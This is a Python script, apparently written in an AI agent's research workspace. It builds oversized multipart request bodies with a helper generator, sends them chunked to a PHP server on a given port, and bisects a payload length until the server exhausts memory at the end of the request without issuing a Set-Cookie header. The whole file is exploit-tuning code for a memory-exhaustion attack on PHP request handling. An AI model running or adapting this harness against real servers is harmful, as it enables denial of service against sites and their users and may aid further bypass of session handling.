#!/usr/bin/env python3
"""Tune an A1 so the OOM happens at END (no Set-Cookie) rather than during parse."""
import argparse, os, re, subprocess, sys

MK = "/tmp/opencode/research/modphp_109619_20261023T010232Z/scripts/mk_a1b.py"
PURE = "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo/pure"
QS = "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"


def build(parts, vlen, path, extra):
    cmd = [sys.executable, MK, "--out", path, "--parts", str(parts),
           "--tail", "1", "--tail-value-len", str(vlen), "--tail-name-len", "35"] + extra
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode:
        raise RuntimeError(r.stderr[-300:])
    return os.path.getsize(path)


def send(port, body, save):
    cmd = [sys.executable, os.path.join(PURE, "chunked_send.py"), "--port", str(port),
           "--body-file", body, "--path", QS, "--timeout", "60",
           "--save-response", save]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
    m = re.search(r"status='([^']*)'", r.stdout)
    st = m.group(1) if m else "ERR"
    mm = re.search(r"HTTP/1\.[01] (\d{3})", st)
    code = int(mm.group(1)) if mm else -1
    try:
        raw = open(save, "rb").read()
    except OSError:
        raw = b""
    return code, st, len(raw), (b"Set-Cookie: PHPSESSID=" in raw)


def one(port, parts, vlen, outdir, extra, tag):
    body = os.path.join(outdir, "a1t_%s.bin" % tag)
    sz = build(parts, vlen, body, extra)
    save = os.path.join(outdir, "a1t_%s.resp" % tag)
    code, st, n, cookie = send(port, body, save)
    os.unlink(body)
    print("V=%-9d body=%-9d code=%-4d resp=%-7d %s cookie=%s" % (vlen, sz, code, n, st, cookie), flush=True)
    return code, n, cookie


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--parts", type=int, default=820)
    ap.add_argument("--scan", type=int, nargs=2)
    ap.add_argument("--bisect", type=int, default=0)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--extra", default="")
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)
    extra = args.extra.split() if args.extra else []
    lo, hi = args.scan if args.scan else (0, 1)
    code, n, ck = one(args.port, args.parts, lo, args.outdir, extra, "lo")
    if code >= 500 and not ck:
        print("*** END-OOM at lo V=%d" % lo)
        return
    if args.scan:
        code2, n2, ck2 = one(args.port, args.parts, hi, args.outdir, extra, "hi")
        if code2 < 500:
            print("no OOM at hi; increase hi")
            return
    else:
        return
    for i in range(args.bisect):
        mid = (lo + hi) // 2
        code, n, ck = one(args.port, args.parts, mid, args.outdir, extra, "b%02d" % i)
        oom = code >= 500
        if oom:
            hi = mid
        else:
            lo = mid
        if oom and not ck:
            print("*** END-OOM candidate at V=%d" % mid, flush=True)
        print("   window [%d,%d)" % (lo, hi), flush=True)


if __name__ == "__main__":
    main()
